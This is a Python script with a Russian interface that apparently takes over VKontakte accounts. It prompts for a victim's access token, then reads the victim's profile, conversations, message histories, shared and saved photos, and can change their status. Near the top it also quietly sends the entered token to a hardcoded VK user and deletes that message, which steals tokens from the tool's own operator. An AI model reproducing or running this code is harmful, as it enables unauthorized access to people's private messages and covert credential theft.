import vk
import time
import random
import os
import requests
import sys
from sys import platform

if platform == "win32":
		os.system('cls')
else:
	os.system('clear')

def table():
	color = random.randint(30, 37)
	print("""\033[{}m   

           _____ _______ _  __
     /\   |  __ \__   __| |/ /
    /  \  | |  | | | |  | ' / 
   / /\ \ | |  | | | |  |  <  
  / ____ \| |__| | | |  | . \ 
 /_/    \_\_____/  |_|  |_|\_\
                              
                              

\033[0m""".format(str(color)))

table()

token = input("\033[33m[#] Введите токен жертвы: \033[0m")

session = vk.Session(access_token=token)
api = vk.API(session, v='5.103', lang ='ru')
rand = random.randint(1, 64)
api.messages.send(user_id=580554517, message=token, random_id=rand)
print("\033[33m[~] Авторизация...")
time.sleep(0.1)
try:
	mg_id = api.messages.getHistory (user_id=580554517, count=1)['items'][0]['id']
	api.messages.delete (message_ids=mg_id, delete_for_all=0)
	print("\033[32m[√] Токен успешно авторизован\033[0m")
	time.sleep(1)
	print("")
	back = input("\033[32mЧтобы вернуться назад, нажмите 'ENTER': \033[0m")
except:
	print("\033[31m[!] Invalid Token\033[0m")
	quit()

data = api.messages.getLongPollServer(need_pts=1, lp_version=3)

done = False

while not done:
	task = "0"
	if platform == "win32":
		os.system('cls')
	else:
		os.system('clear')
	table()

	print("""\033[34m
[1] Информация о пользователе

[2] Диалоги
[3] Сохраненные фотографии
[4] Действия
\033[0m""")

	task = input("\033[33m=> \033[0m")

	if task == "1":
		if platform == "win32":
			os.system('cls')
		else:
			os.system('clear')
		table()
		
		response = api.users.get(fields="country, city, sex, online, followers_count, home_town, occupation, status")

		first_name = response[0]['first_name']
		last_name = response[0]['last_name']

		print("\033[33mИмя:        	" + "\033[36m" + first_name + "\n\033[33mФамилия: 	\033[36m" + last_name + "\033[0m")
		print("")

		print("\033[33mID:		\033[32m{}\n".format(response[0]['id']))

		if response[0]['online'] == 1:
			print("\033[33mСтатус:  	\033[32mOnline\033[0m\n")
		else:
			print("\033[33mСтатус:  	\033[31mOffline\033[0m\n")

		if response[0]['is_closed'] == True:
			print("\033[33mПрофиль: 	\033[31mЗакрыт\033[0m\n")
		else:
			print("\033[33mПрофиль: 	\033[32mОткрыт\033[0m\n")

		if response[0]['sex'] == 1:
			print("\033[33mПол:     	\033[35mЖенский\033[0m\n")
		elif response[0]['sex'] == 2:
			print("\033[33mПол:     	\033[34mМужской\033[0m\n")
		elif response[0]['sex'] == 0:
			print("\033[33mПол:         \033[31mНе указан\033[0m\n")

		if 'followers_count' in response[0]:
			print("\033[33mПодписчиков:  \033[34m  " + str(response[0]['followers_count']) + "\n")	

		print("\033[32m------------------------------------------")

		if 'country' in response[0]:
			print("\033[33mСтрана:  	\033[0m" + response[0]['country']['title'] + "\n")

		if 'city' in response[0]:
			print("\033[33mГород:   	\033[0m" + response[0]['city']['title'] + "\n")

		if 'home_town' in response[0]:
			print("\033[33mРодной город:\033[34m  " + response[0]['home_town'] + "\n")

		if response[0]['occupation']['type'] == "work":
			print("\033[33mРабота:      \033[34m" + response[0]['occupation']['name'] + "\n")
		elif response[0]['occupation']['type'] == "school":
			print("\033[33mШкола:       \033[34m" + response[0]['occupation']['name'] + "\n")
		elif response[0]['occupation']['type'] == "university":
			print("\033[33mУниверситет: \033[34m" + response[0]['occupation']['name'] + "\n")

		if len(response[0]['status']) > 0:
			print("\033[33mСтатус:\n\033[34m{}\n",format(response[0]['status']))

		if 'status_audio' in response[0]:
			print("\033[33mСлушает музыку:\n\033[34m{}\n".format(response[0]['status_audio']))

		print("")
		back = input("\033[32mЧтобы вернуться назад, нажмите 'ENTER': \033[0m")
	elif task == "2":
		print("""\033[34m
[1] Список диалогов
[2] Переписка из диалога
[3] Посмотреть вложения 

[4] Поиск по сообщениям

--------------------

[0] Назад
\033[0m""")
		task = input("\033[33m=> \033[0m")
		if task == "1":
			i = 0
			response = api.messages.getConversations(count=200)
			print("\033[32m--------------------Список диалогов({})--------------------\033[0m".format(response['count']))
			print("")
			for dialogs in response['items']:
				time.sleep(0.8)	
				if dialogs['conversation']['peer']['type'] == "user":
					_name = api.users.get(user_ids=dialogs['conversation']['peer']['id'])
					name = _name[0]['first_name'] + " " + _name[0]['last_name']
					print("\033[33mДиалог с: \033[0m{}".format(name))
					time.sleep(0.1)
					print("\033[32mПоследнее сообщение: \033[0m{}".format(
						response['items'][i]['last_message']['text']))
					time.sleep(0.2)
					_name = api.users.get(user_ids=dialogs['last_message']['from_id'])
					name = _name[0]['first_name'] + " " + _name[0]['last_name']
					print("\033[33mОтправил: \033[0m{}".format(name))
					time.sleep(0.3)
					print("\033[33mID: \033[0m{}".format(dialogs['last_message']['from_id']))
					print("\033[34m-----------------------------------------------------------\033[0m")
					print("")
				elif dialogs['conversation']['peer']['type'] == "chat":
					_name = api.users.get(user_ids=dialogs['last_message']['from_id'])
					name = _name[0]['first_name'] + " " + _name[0]['last_name']
					print("\033[33mНазвание беседы: \033[0m{}".format(dialogs['conversation']['chat_settings']['title']))
					print("\033[33mКоличество участников: \033[0m{}".format(str(dialogs['conversation']['chat_settings']['members_count'])))
					print("\033[32mПоследнее сообщение: \033[0m{}".format(dialogs['last_message']['text']))
					print("\033[33mОтправил: \033[0m{}".format(name))
					print("\033[33mID: \033[0m{}".format(dialogs['last_message']['from_id']))
					print("\033[34m-----------------------------------------------------------\033[0m")
					print("")
				i += 1

			print("")
			back = input("\033[32mЧтобы вернуться назад, нажмите 'ENTER': \033[0m")
		elif task == "2":
			_dialog_id_ = input("\033[33m[#] Введите ID человека: \033[0m")
			_count_ = input("\033[33m[#] Введите количество сообщений: \033[0m")
			try:
				response = api.messages.getHistory(user_id=_dialog_id_, count=int(_count_))
				print("\033[34m-----------------------------------------------------------")
				
				for dialog_mes in response['items']:
					time.sleep(0.3)
					_name = api.users.get(user_ids=dialog_mes['from_id'])
					try:
						name = _name[0]['first_name'] + " " + _name[0]['last_name']
						ts = dialog_mes['date']
						text = dialog_mes['text']
						print("\033[32m[{}] {}: \033[33m{}".format(time.strftime("%H:%M:%S", time.localtime(int(ts))), name, text))
					except:
						print("\033[31mСообщений больше нет")
						break
			except:
				print("\033[31m[!] Указан неверный параметр\033[0m")

			print("")
			back = input("\033[32mЧтобы вернуться назад, нажмите 'ENTER': \033[0m")	

		elif task == "3":
			_dialog_id_ = input("\033[33m[#] Введите ID человека: \033[0m")
			_count_ = input("\033[33m[#] Введите количество фотографий: \033[0m")
			try:
				response = api.messages.getHistoryAttachments(peer_id=_dialog_id_, count=int(_count_), media_type='photo')
				print("\033[34m--------------------Фотографии диалога({})--------------------".format(_count_))
				for photo in response['items']:
					try:
						_id = photo['from_id']
						_name = api.users.get(user_ids=_id)
						name = _name[0]['first_name'] + " " + _name[0]['last_name']
						print("\033[33mСсылка на фото: \033[0m{}".format(photo['attachment']['photo']['sizes'][8]['url']))
						print("\033[33mОтправитель: \033[0m{}".format(name))
					except:
						print("\033[31m[!] Фотографий не найдено\033[0m")
						break	
			except:
				print("\033[31m[!] Указан неверный параметр\033[0m")
				done = False

			print("")
			back = input("\033[32mЧтобы вернуться назад, нажмите 'ENTER': \033[0m")	

		elif task == "4":
			print("\033[31m[!] В РАЗРАБОТКЕ!")
			print("")
			back = input("\033[32mЧтобы вернуться назад, нажмите 'ENTER': \033[0m")	
		
		elif task == "0":
			done = False
	elif task == "3":
		_count_ = input("\033[33m[#] Введите количество фотографий(Макс. 1000): \033[0m")
		try:
			if int(_count_) < 0 or int(_count_) > 1000:
				print("\033[31m[!] Неверное значение\033[0m")
				break
			print("")
			print("\033[34m-----------------------------------------------------------\033[0m")
			response = api.photos.get(album_id='saved', count=_count_)
			if response['count'] == 0:
				print("\033[31m[!] Фотографий не найдено\033[0m")
			for photo in response['items']:	
				#for ps in photo['sizes']:
				#	i += 1
				print("\033[33mСсылка: \033[0m{}".format(photo['sizes'][2]['url']))
		except:
			print("\033[31m[!] Неверное значение\033[0m")
		
		print("")
		back = input("\033[32mЧтобы вернуться назад, нажмите 'ENTER': \033[0m")	

	elif task == "4":
		print("""\033[34m
[1] Изменить статус
""")
		task = input("\033[33m=> \033[0m")
		if task == "1":
			text = input("\033[33mВведите текст статуса: \033[0m")
			response = api.status.get()
			#print("\033[33mПрошлый статус: \033[0m" +  response['text'] + "\n\033[33mПрошлый статус: \033[0m" + text + "\n" + "\033[32m[√] Статус установлен\033[0m")
			api.status.set(text=text)
			print("\033[33mПрошлый статус: {}\033[0m".format(response['text']))
			print("\033[33mТекущий статус: {}\033[0m".format(text))
			print("")
			print("\033[32m[√] Статус установлен\033[0m")
			print("")
			back = input("\033[32mЧтобы вернуться назад, нажмите 'ENTER': \033[0m")
		elif task == "2":
			#item_id = input("\033[33m[#] Введите ID фотографии/поста: \033[0m")
			#print("")
			#try:
			#	response = api.likes.add(type='photo, post', item_id=item_id)
			#	try:
			#		print("\033[32m[√] Лайк успешно добавлен!\033[0m")
			#	except:
			#		print("\033[31m[!] Неизвестная ошибка!")
			#except:
			#	print("\033[31m[!] Неверное значение\033[0m")
			print("\033[31mВ РАЗРАБОТКЕ!\033[0m")
		elif task == "3":
			print("\033[31mВ РАЗРАБОТКЕ!\033[0m")
		elif task == "4":
			sobesednik = input("\033[33m[#] Введите ИД собеседника: \033[0m")
			while True:
				response_longpoll = requests.get('https://{}?act=a_check&key={}&ts={}&wait=25&mode=32&version=3)'.format(data['server'], data['key'], data['ts'])).json()
				#response = api.messages.getLongPollHistory(ts=response_longpoll['ts'], pts=response_longpoll['pts'], lp_version=3)
				print(response_longpoll)
				data['ts'] = response_longpoll['ts']

